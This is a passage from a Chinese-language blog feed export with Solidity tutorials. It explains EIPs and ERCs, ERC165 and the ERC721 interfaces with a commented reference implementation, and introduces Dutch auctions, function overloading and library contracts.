<code>Ethereum</code> 生态中任意领域的改进, 比如新特性、ERC、协议改进、编程工具等等。</p><p><code>ERC</code>全称 Ethereum Request For Comment (以太坊意见征求稿), 用以记录以太坊上应用级的各种开发标准和协议。如典型的Token标准(<code>ERC20</code>, <code>ERC721</code>)、名字注册(<code>ERC26</code>, <code>ERC13</code>), URI范式(<code>ERC67</code>), Library/Package格式(<code>EIP82</code>), 钱包格式(<code>EIP75</code>,<code>EIP85</code>)。</p><p>ERC协议标准是影响以太坊发展的重要因素, 像<code>ERC20</code>, <code>ERC223</code>, <code>ERC721</code>, <code>ERC777</code>等, 都是对以太坊生态产生了很大影响。</p><p>所以最终结论：<code>EIP</code>包含<code>ERC</code>。</p><h4 id="ERC165"><a href="#ERC165" class="headerlink" title="ERC165"></a>ERC165</h4><p>通过<a href="https://eips.ethereum.org/EIPS/eip-165">ERC165标准</a>，智能合约可以声明它支持的接口，供其他合约检查。简单的说，ERC165就是检查一个智能合约是不是支持了<code>ERC721</code>，<code>ERC1155</code>的接口。</p><p><code>IERC165</code>接口合约只声明了一个<code>supportsInterface</code>函数，输入要查询的<code>interfaceId</code>接口id，若合约实现了该接口id，则返回<code>true</code>：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">interface IERC165 &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev </span>如果合约实现了查询的`interfaceId`，则返回true</span></span><br><span class="line"><span class="comment">     * 规则详见：https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">supportsInterface</span>(<span class="params">bytes4 interfaceId</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看下<code>ERC721</code>是如何实现<code>supportsInterface()</code>函数的：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">supportsInterface</span>(<span class="params">bytes4 interfaceId</span>) <span class="title">external</span> <span class="title">pure</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">           interfaceId == type(IERC721).interfaceId ||</span><br><span class="line">           interfaceId == type(IERC165).interfaceId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>当查询的是<code>IERC721</code>或<code>IERC165</code>的接口id时，返回<code>true</code>；反之返回<code>false</code>。</p><h4 id="IERC721"><a href="#IERC721" class="headerlink" title="IERC721"></a>IERC721</h4><p><code>IERC721</code>是<code>ERC721</code>标准的接口合约，规定了<code>ERC721</code>要实现的基本函数。它利用<code>tokenId</code>来表示特定的非同质化代币，授权或转账都要明确<code>tokenId</code>；而<code>ERC20</code>只需要明确转账的数额即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev ERC721标准接口.</span><br><span class="line"> */</span><br><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br></pre></td></tr></table></figure><h5 id="IERC721事件"><a href="#IERC721事件" class="headerlink" title="IERC721事件"></a>IERC721事件</h5><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenid</code>。</li><li><code>Approval</code>事件：在授权时释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenid</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h5 id="IERC721函数"><a href="#IERC721函数" class="headerlink" title="IERC721函数"></a>IERC721函数</h5><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h4 id="IERC721Receiver"><a href="#IERC721Receiver" class="headerlink" title="IERC721Receiver"></a>IERC721Receiver</h4><p>如果一个合约没有实现<code>ERC721</code>的相关函数，转入的<code>NFT</code>就进了黑洞，永远转不出来了。为了防止误转账，<code>ERC721</code>实现了<code>safeTransferFrom()</code>安全转账函数，目标合约必须实现了<code>IERC721Receiver</code>接口才能接收<code>ERC721</code>代币，不然会<code>revert</code>。<code>IERC721Receiver</code>接口只包含一个<code>onERC721Received()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC721接收者接口：合约必须实现这个接口来通过安全转账接收ERC721</span><br><span class="line">interface IERC721Receiver &#123;</span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bytes4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看下<code>ERC721</code>利用<code>_checkOnERC721Received</code>来确保目标合约实现了<code>onERC721Received()</code>函数（返回<code>onERC721Received</code>的<code>selector</code>）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _checkOnERC721Received(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) private returns (bool) &#123;</span><br><span class="line">        if (to.isContract()) &#123;</span><br><span class="line">            return</span><br><span class="line">                IERC721Receiver(to).onERC721Received(</span><br><span class="line">                    msg.sender,</span><br><span class="line">                    from,</span><br><span class="line">                    tokenId,</span><br><span class="line">                    _data</span><br><span class="line">                ) == IERC721Receiver.onERC721Received.selector;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="IERC721Metadata"><a href="#IERC721Metadata" class="headerlink" title="IERC721Metadata"></a>IERC721Metadata</h4><p><code>IERC721Metadata</code>是<code>ERC721</code>的拓展接口，实现了3个查询<code>metadata</code>元数据的常用函数：</p><ul><li><code>name()</code>：返回代币名称。</li><li><code>symbol()</code>：返回代币代号。</li><li><code>tokenURI()</code>：通过<code>tokenId</code>查询<code>metadata</code>的链接<code>url</code>，<code>ERC721</code>特有的函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface IERC721Metadata is IERC721 &#123;</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function tokenURI(uint256 tokenId) external view returns (string memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ERC721主合约"><a href="#ERC721主合约" class="headerlink" title="ERC721主合约"></a>ERC721主合约</h4><p><code>ERC721</code>主合约实现了<code>IERC721</code>，<code>IERC165</code>和<code>IERC721Metadata</code>定义的所有功能，包含<code>4</code>个状态变量和<code>17</code>个函数。实现都比较简单，每个函数的功能见代码注释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// by 0xAA</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;./IERC165.sol&quot;;</span><br><span class="line">import &quot;./IERC721.sol&quot;;</span><br><span class="line">import &quot;./IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;./IERC721Metadata.sol&quot;;</span><br><span class="line">import &quot;./Address.sol&quot;;</span><br><span class="line">import &quot;./String.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ERC721 is IERC721, IERC721Metadata&#123;</span><br><span class="line">    using Address for address; // 使用Address库，用isContract来判断地址是否为合约</span><br><span class="line">    using Strings for uint256; // 使用String库，</span><br><span class="line"></span><br><span class="line">    // Token名称</span><br><span class="line">    string public override name;</span><br><span class="line">    // Token代号</span><br><span class="line">    string public override symbol;</span><br><span class="line">    // tokenId 到 owner address 的持有人映射</span><br><span class="line">    mapping(uint =&gt; address) private _owners;</span><br><span class="line">    // address 到 持仓数量 的持仓量映射</span><br><span class="line">    mapping(address =&gt; uint) private _balances;</span><br><span class="line">    // tokenID 到 授权地址 的授权映射</span><br><span class="line">    mapping(uint =&gt; address) private _tokenApprovals;</span><br><span class="line">    //  owner地址。到operator地址 的批量授权映射</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 构造函数，初始化`name` 和`symbol` .</span><br><span class="line">     */</span><br><span class="line">    constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">        name = name_;</span><br><span class="line">        symbol = symbol_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC165接口supportsInterface</span><br><span class="line">    function supportsInterface(bytes4 interfaceId)</span><br><span class="line">        external</span><br><span class="line">        pure</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        return</span><br><span class="line">            interfaceId == type(IERC721).interfaceId ||</span><br><span class="line">            interfaceId == type(IERC165).interfaceId ||</span><br><span class="line">            interfaceId == type(IERC721Metadata).interfaceId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的balanceOf，利用_balances变量查询owner地址的balance。</span><br><span class="line">    function balanceOf(address owner) external view override returns (uint) &#123;</span><br><span class="line">        require(owner != address(0), &quot;owner = zero address&quot;);</span><br><span class="line">        return _balances[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的ownerOf，利用_owners变量查询tokenId的owner。</span><br><span class="line">    function ownerOf(uint tokenId) public view override returns (address owner) &#123;</span><br><span class="line">        owner = _owners[tokenId];</span><br><span class="line">        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的isApprovedForAll，利用_operatorApprovals变量查询owner地址是否将所持NFT批量授权给了operator地址。</span><br><span class="line">    function isApprovedForAll(address owner, address operator)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        return _operatorApprovals[owner][operator];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的setApprovalForAll，将持有代币全部授权给operator地址。调用_setApprovalForAll函数。</span><br><span class="line">    function setApprovalForAll(address operator, bool approved) external override &#123;</span><br><span class="line">        _operatorApprovals[msg.sender][operator] = approved;</span><br><span class="line">        emit ApprovalForAll(msg.sender, operator, approved);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的getApproved，利用_tokenApprovals变量查询tokenId的授权地址。</span><br><span class="line">    function getApproved(uint tokenId) external view override returns (address) &#123;</span><br><span class="line">        require(_owners[tokenId] != address(0), &quot;token doesn&#x27;t exist&quot;);</span><br><span class="line">        return _tokenApprovals[tokenId];</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    // 授权函数。通过调整_tokenApprovals来，授权 to 地址操作 tokenId，同时释放Approval事件。</span><br><span class="line">    function _approve(</span><br><span class="line">        address owner,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) private &#123;</span><br><span class="line">        _tokenApprovals[tokenId] = to;</span><br><span class="line">        emit Approval(owner, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 实现IERC721的approve，将tokenId授权给 to 地址。条件：to不是owner，且msg.sender是owner或授权地址。调用_approve函数。</span><br><span class="line">    function approve(address to, uint tokenId) external override &#123;</span><br><span class="line">        address owner = _owners[tokenId];</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner || _operatorApprovals[owner][msg.sender],</span><br><span class="line">            &quot;not owner nor approved for all&quot;</span><br><span class="line">        );</span><br><span class="line">        _approve(owner, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查询 spender地址是否可以使用tokenId（他是owner或被授权地址）。</span><br><span class="line">    function _isApprovedOrOwner(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) private view returns (bool) &#123;</span><br><span class="line">        return (spender == owner ||</span><br><span class="line">            _tokenApprovals[tokenId] == spender ||</span><br><span class="line">            _operatorApprovals[owner][spender]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * 转账函数。通过调整_balances和_owner变量将 tokenId 从 from 转账给 to，同时释放Transfer事件。</span><br><span class="line">     * 条件:</span><br><span class="line">     * 1. tokenId 被 from 拥有</span><br><span class="line">     * 2. to 不是0地址</span><br><span class="line">     */</span><br><span class="line">    function _transfer(</span><br><span class="line">        address owner,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) private &#123;</span><br><span class="line">        require(from == owner, &quot;not owner&quot;);</span><br><span class="line">        require(to != address(0), &quot;transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _approve(owner, address(0), tokenId);</span><br><span class="line"></span><br><span class="line">        _balances[from] -= 1;</span><br><span class="line">        _balances[to] += 1;</span><br><span class="line">        _owners[tokenId] = to;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 实现IERC721的transferFrom，非安全转账，不建议使用。调用_transfer函数</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) external override &#123;</span><br><span class="line">        address owner = ownerOf(tokenId);</span><br><span class="line">        require(</span><br><span class="line">            _isApprovedOrOwner(owner, msg.sender, tokenId),</span><br><span class="line">            &quot;not owner nor approved&quot;</span><br><span class="line">        );</span><br><span class="line">        _transfer(owner, from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 安全转账，安全地将 tokenId 代币从 from 转移到 to，会检查合约接收者是否了解 ERC721 协议，以防止代币被永久锁定。调用了_transfer函数和_checkOnERC721Received函数。条件：</span><br><span class="line">     * from 不能是0地址.</span><br><span class="line">     * to 不能是0地址.</span><br><span class="line">     * tokenId 代币必须存在，并且被 from拥有.</span><br><span class="line">     * 如果 to 是智能合约, 他必须支持 IERC721Receiver-onERC721Received.</span><br><span class="line">     */</span><br><span class="line">    function _safeTransfer(</span><br><span class="line">        address owner,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) private &#123;</span><br><span class="line">        _transfer(owner, from, to, tokenId);</span><br><span class="line">        require(_checkOnERC721Received(from, to, tokenId, _data), &quot;not ERC721Receiver&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 实现IERC721的safeTransferFrom，安全转账，调用了_safeTransfer函数。</span><br><span class="line">     */</span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) public override &#123;</span><br><span class="line">        address owner = ownerOf(tokenId);</span><br><span class="line">        require(</span><br><span class="line">            _isApprovedOrOwner(owner, msg.sender, tokenId),</span><br><span class="line">            &quot;not owner nor approved&quot;</span><br><span class="line">        );</span><br><span class="line">        _safeTransfer(owner, from, to, tokenId, _data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // safeTransferFrom重载函数</span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId</span><br><span class="line">    ) external override &#123;</span><br><span class="line">        safeTransferFrom(from, to, tokenId, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /** </span><br><span class="line">     * 铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。</span><br><span class="line">     * 这个mint函数所有人都能调用，实际使用需要开发人员重写，加上一些条件。</span><br><span class="line">     * 条件:</span><br><span class="line">     * 1. tokenId尚不存在。</span><br><span class="line">     * 2. to不是0地址.</span><br><span class="line">     */</span><br><span class="line">    function _mint(address to, uint tokenId) internal virtual &#123;</span><br><span class="line">        require(to != address(0), &quot;mint to zero address&quot;);</span><br><span class="line">        require(_owners[tokenId] == address(0), &quot;token already minted&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[to] += 1;</span><br><span class="line">        _owners[tokenId] = to;</span><br><span class="line"></span><br><span class="line">        emit Transfer(address(0), to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 销毁函数，通过调整_balances和_owners变量来销毁tokenId，同时释放Transfer事件。条件：tokenId存在。</span><br><span class="line">    function _burn(uint tokenId) internal virtual &#123;</span><br><span class="line">        address owner = ownerOf(tokenId);</span><br><span class="line">        require(msg.sender == owner, &quot;not owner of token&quot;);</span><br><span class="line"></span><br><span class="line">        _approve(owner, address(0), tokenId);</span><br><span class="line"></span><br><span class="line">        _balances[owner] -= 1;</span><br><span class="line">        delete _owners[tokenId];</span><br><span class="line"></span><br><span class="line">        emit Transfer(owner, address(0), tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // _checkOnERC721Received：函数，用于在 to 为合约的时候调用IERC721Receiver-onERC721Received, 以防 tokenId 被不小心转入黑洞。</span><br><span class="line">    function _checkOnERC721Received(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint tokenId,</span><br><span class="line">        bytes memory _data</span><br><span class="line">    ) private returns (bool) &#123;</span><br><span class="line">        if (to.isContract()) &#123;</span><br><span class="line">            return</span><br><span class="line">                IERC721Receiver(to).onERC721Received(</span><br><span class="line">                    msg.sender,</span><br><span class="line">                    from,</span><br><span class="line">                    tokenId,</span><br><span class="line">                    _data</span><br><span class="line">                ) == IERC721Receiver.onERC721Received.selector;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 实现IERC721Metadata的tokenURI函数，查询metadata。</span><br><span class="line">     */</span><br><span class="line">    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) &#123;</span><br><span class="line">        require(_owners[tokenId] != address(0), &quot;Token Not Exist&quot;);</span><br><span class="line"></span><br><span class="line">        string memory baseURI = _baseURI();</span><br><span class="line">        return bytes(baseURI).length &gt; 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 计算&#123;tokenURI&#125;的BaseURI，tokenURI就是把baseURI和tokenId拼接在一起，需要开发重写。</span><br><span class="line">     * BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ </span><br><span class="line">     */</span><br><span class="line">    function _baseURI() internal view virtual returns (string memory) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="荷兰拍卖"><a href="#荷兰拍卖" class="headerlink" title="荷兰拍卖"></a>荷兰拍卖</h2><p>荷兰拍卖（<code>Dutch Auction</code>）是一种特殊的拍卖形式。 亦称“减价拍卖”，它是指拍卖标的的竞价由高到低依次递减直到第一个竞买人应价（达到或超过底价）时击槌成交的一种拍卖。</p><p>卖家有100朵鲜花，必须在一天内卖完，否则花就谢了。首先，卖家设定最高价为每朵100元，每两个小时降价10元。拍卖开始后没有人竞价。过了两个小时，降到每朵90元时，有个竞买人竞价。如果他买100朵，则拍卖到此结束，此竞买人成为买受人，100朵鲜花以每朵90元成交。如果他只买70朵，那么剩下的30朵继续拍卖。如果一天过去了，不再有人竞价，那么拍卖的结果是唯一的竞买人成为买受人，以每朵90元的成交价买走70朵花。但是，如果过了两小时又有人来竞买剩下的30朵花，而价格为每朵80元。这时结束拍卖，第一个人以每朵90元的价格买了70朵，第二个人以每朵80元的价格买了30朵。</p><p>在币圈，很多<code>NFT</code>通过荷兰拍卖发售，其中包括<code>Azuki</code>和<code>World of Women</code>，其中<code>Azuki</code>通过荷兰拍卖筹集了超过<code>8000</code>枚<code>ETH</code>。</p><p>项目方非常喜欢这种拍卖形式，主要有两个原因</p><ol><li>荷兰拍卖的价格由最高慢慢下降，能让项目方获得最大的收入。</li><li>拍卖持续较长时间（通常6小时以上），可以避免<code>gas war</code>。</li></ol><p><strong>荷兰拍卖合约</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ERC20&quot;&gt;&lt;a href=&quot;#ERC20&quot; class=&quot;headerlink&quot; title=&quot;ERC20&quot;&gt;&lt;/a&gt;ERC20&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ERC20&lt;/code&gt;是以太坊上的代币标准，来自2015年11月V神参与的&lt;a href=&quot;https</summary>
      
    
    
    
    
    <category term="区块链" scheme="https://banana69.site/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Solididy进阶</title>
    <link href="https://banana69.site/2022/10/22/solidity%E8%BF%9B%E9%98%B6/"/>
    <id>https://banana69.site/2022/10/22/solidity%E8%BF%9B%E9%98%B6/</id>
    <published>2022-10-22T01:24:02.000Z</published>
    <updated>2022-11-10T11:29:08.220Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-函数重载"><a href="#0x01-函数重载" class="headerlink" title="0x01 函数重载"></a>0x01 函数重载</h3><p>函数名相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<code>solidity</code>不允许修饰器（<code>modifier</code>）重载。</p><p>重载函数在经过编译后，由于不同的参数类型，其函数选择器也不相同。</p><p>再调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配，如果出现多个匹配的重载函数则会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>f(50)</code>会报错，因为 50 既可以被转换为 uint8 ，也可以被转换为uint256。</p><h3 id="0x02-库合约"><a href="#0x02-库合约" class="headerlink" title="0x02 库合约"></a>0x02 库合约</h3><p>库函数是一种特殊的合约，为了提升<code>solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约一般都是一些好用的函数合集（<code>库函数</code>）。</p><p>库合约与普通合约有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接受以太币</li><li>不可以被销毁</li></ol><p><strong>使用库合约：</strong></p><ol><li><p><strong>using for</strong></p><p> <code>using for</code>指令可将库函数附加到任何类型，添加指令后，库 A 中的函数会自动添加为 B 类型变量的成员，并且可以直接调用，<strong>在调用时，这个变量会被当作第一个参数传递给函数。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 利用using for指令</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // 库函数会自动添加为uint256型变量的成员</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>通过库合约名称调用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 直接通过库合约名调用</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><code>String</code>库合约是将uint256类型转换为相应的<code>string</code>类型的代码库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收与发送ETH"><a href="#接收与发送ETH" class="headerlink" title="接收与发送ETH"></a>接收与发送ETH</h3><h5 id="接收ETH"><a href="#接收ETH" class="headerlink" 